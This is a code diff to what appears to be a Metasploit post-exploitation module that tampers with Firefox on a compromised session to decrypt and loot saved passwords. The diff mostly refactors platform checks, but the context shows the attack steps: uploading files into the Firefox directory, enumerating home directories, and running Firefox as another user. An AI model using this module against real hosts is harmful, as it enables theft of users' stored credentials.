@@ -73,11 +73,11 @@ class MetasploitModule < Msf::Post
     # Certain shells for certain platform
     vprint_status("Determining session platform and type")
     case session.platform
-    when /unix|linux|bsd/
+    when 'unix', 'linux', 'bsd'
       @platform = :unix
-    when /osx/
+    when 'osx'
       @platform = :osx
-    when /win/
+    when 'windows'
       if session.type != "meterpreter"
         print_error "Only meterpreter sessions are supported on Windows hosts"
         return
@@ -174,7 +174,7 @@ class MetasploitModule < Msf::Post
     end
 
     print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
-    print_warning("This may take some time...") if @platform =~ /unix|osx/
+    print_warning("This may take some time...") if [:unix, :osx].include?(@platform)
 
     if session.type == "meterpreter"
       session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
@@ -367,7 +367,7 @@ class MetasploitModule < Msf::Post
     loot_file = Rex::Text::rand_text_alpha(6) + ".txt"
 
     case @platform
-    when /win/
+    when :windows
       unless got_root || session.sys.config.sysinfo['OS'] =~ /xp/i
         print_warning("You may need SYSTEM privileges on this platform for the DECRYPT option to work")
       end
@@ -379,7 +379,7 @@ class MetasploitModule < Msf::Post
       # This way allows for more independent use of meterpreter payload (32 and 64 bit) and cleaner code
       check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
       check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
-    when /unix/
+    when :unix
       unless got_root
         print_error("You need ROOT privileges on this platform for DECRYPT option")
         return false
@@ -396,7 +396,7 @@ class MetasploitModule < Msf::Post
       check_paths << '/usr/lib64/firefox/'
       check_paths << '/usr/lib/iceweasel/'
       check_paths << '/usr/lib64/iceweasel/'
-    when /osx/
+    when :osx
       tmpdir = '/tmp/'
       check_paths << '/applications/firefox.app/contents/macos/'
     end
@@ -547,7 +547,8 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     args = '-purgecaches -chrome chrome://passwordmgr/content/passwordManager.xul'
 
     # In case of unix-like platform Firefox needs to start under user context
-    if @platform =~ /unix/
+    case @platform
+    when :unix
       # Assuming userdir /home/(x) = user
       print_status("Enumerating users")
       users = cmd_exec("ls /home 2>/dev/null")
@@ -560,10 +561,10 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       args.insert(0, "\"#{@paths['ff']}firefox --display=:0 ")
       args << "\""
       cmd = "su #{user} -c"
-    elsif @platform =~ /win|osx/
+    when :windows, :osx
       cmd = @paths['ff'] + "firefox"
       # On OSX, run in background
-      args << "& sleep 5 && killall firefox" if @platform =~ /osx/
+      args << "& sleep 5 && killall firefox" if @platform == :osx
     end
 
     # Check if Firefox is running and kill it
